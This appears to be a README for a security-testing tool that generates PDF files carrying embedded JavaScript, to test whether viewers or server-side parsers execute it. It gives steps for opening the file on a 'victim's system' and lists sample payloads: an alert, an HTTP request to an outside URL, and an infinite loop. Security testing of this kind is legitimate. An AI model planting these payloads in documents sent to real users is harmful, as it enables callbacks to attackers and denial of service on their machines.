# Generate PDF File Containing JavaScript Code

PDF may contain JavaScript code. 
This script allow us to generate a PDF file which helps us to check if that code is executed when the file is opened.
Possible targets are client applications trying to open the file or sererside backends which are parsing the PDF file.

## HowTo

1. Edit the file `poc.js` with the JS code you want to have included in your PDF file
2. Install the required python modules using `pip install pdfrw`
3. Create the PDF: `python poc.py poc.js`
4. Open the file `result.pdf` on your victim's system

## Possible exploit codes

The full set of available functions is documented here: https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/JS_API_AcroJS.html

### XSS (for GUI viewers)

```js
app.alert("XSS");
```

### Open URL

```js
var cURL="http://[REDACTED]/";
var params =
{
     cVerb: "GET",
     cURL: cURL
};
Net.HTTP.request(params);
```

### Timeout

```js
while (true) {}
```

## References

The code is based on https://github.com/osnr/horrifying-pdf-experiments/
